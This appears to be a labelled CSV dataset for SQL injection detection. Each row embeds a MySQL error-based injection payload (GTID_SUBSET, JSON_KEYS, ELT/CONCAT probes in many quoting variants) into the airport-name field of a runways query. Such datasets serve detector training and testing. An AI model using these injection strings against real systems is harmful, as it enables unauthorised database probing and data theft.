full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x66694467 FROM DUAL WHERE 4821=4821 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197))||"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x4458486d WHERE 5768=5768 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197))||"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT 0x4f6a684b WHERE 5029=5029 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197))+"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AS qcDJ WHERE 5936=5936 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- FYFQ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AS IbKL WHERE 2508=2508 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- usgi"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AS eIYk WHERE 3928=3928 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- VBgB"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AS mCzi WHERE 6120=6120 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- Eqsr"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""=""BucksAirport"" AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197) AND ""BucksAirport""=""BucksAirport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' IN BOOLEAN MODE) AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- UrEG"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197) AND (2525=2525"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197) AND ((7437=7437"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport))) AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197) AND (((5294=5294"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- JEol"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)# ixkO"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) WHERE 7780=7780 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- JHKq"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport WHERE 3266=3266 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- IVJf"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT tsTh WHERE 1753=1753 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197))+"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AS cPUT WHERE 5937=5937 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- OsHJ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AS wLEi WHERE 9791=9791 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- woMB"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport` WHERE 8524=8524 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- WnAj"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`) WHERE 9005=9005 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197)-- glsj"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`=`BucksAirport` AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197) AND `BucksAirport`=`BucksAirport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport]-(SELECT 0 WHERE 1660=1660 AND GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(1197=1197,1))),0x71717a7a71),1197))|[BucksAirport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- xGvm"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- oJQJ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- huqf"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND ('UmVm'='UmVm"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND (('LvED'='LvED"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND ((('hkFo'='hkFo"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND 'ffkI'='ffkI"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND ('ZztI' LIKE 'ZztI"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND (('Ozbh' LIKE 'Ozbh"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND ((('Kacg' LIKE 'Kacg"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport%' OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND 'lsTH%'='lsTH"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND 'oypp' LIKE 'oypp"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND (""eSno""=""eSno"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND ((""WVOv""=""WVOv"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND (((""thYu""=""thYu"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND ""UvIJ""=""UvIJ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND (""fxjJ"" LIKE ""fxjJ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND ((""EyWM"" LIKE ""EyWM"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND (((""kKlO"" LIKE ""kKlO"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND ""uMdG"" LIKE ""uMdG"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) OR 'VamU'='WeTE"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') WHERE 6339=6339 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- zQoH"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") WHERE 4117=4117 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- kjpJ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' WHERE 7344=7344 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- ISda"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" WHERE 1501=1501 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- YaEB"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x526b4a4d WHERE 8354=8354 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925))||'"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x76636e56 FROM DUAL WHERE 1918=1918 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925))||'"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'+(SELECT 0x424d4d4e WHERE 3492=3492 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925))+'"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x52636878 FROM DUAL WHERE 6964=6964 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925))||"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x43686978 WHERE 1871=1871 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925))||"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT 0x75504e53 WHERE 1422=1422 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925))+"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AS cDDA WHERE 5529=5529 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- TZmy"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AS QTpo WHERE 9980=9980 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- QKQZ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AS PTOu WHERE 9286=9286 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- bgJo"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AS tKxn WHERE 3860=3860 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- tTlb"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""=""BucksAirport"" OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND ""BucksAirport""=""BucksAirport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' IN BOOLEAN MODE) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- NMOc"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND (2871=2871"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND ((9261=9261"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport))) OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND (((2919=2919"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- jchp"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)# gXpM"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) WHERE 1261=1261 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- GYYQ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport WHERE 2632=2632 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- yBqh"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT yLUC WHERE 3891=3891 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925))+"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AS bpBl WHERE 9800=9800 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- HDMc"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AS QFQD WHERE 5154=5154 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- pKqv"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport` WHERE 2479=2479 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- MfCS"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`) WHERE 9654=9654 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925)-- Tyrk"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`=`BucksAirport` OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925) AND `BucksAirport`=`BucksAirport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport]-(SELECT 0 WHERE 8003=8003 OR GTID_SUBSET(CONCAT(0x716a6b7871,(SELECT (ELT(2925=2925,1))),0x71717a7a71),2925))|[BucksAirport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- yyMT"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- lEeL"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- CPsw"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND ('pqGW'='pqGW"");",1,airport-S12,Unknown,Unknown
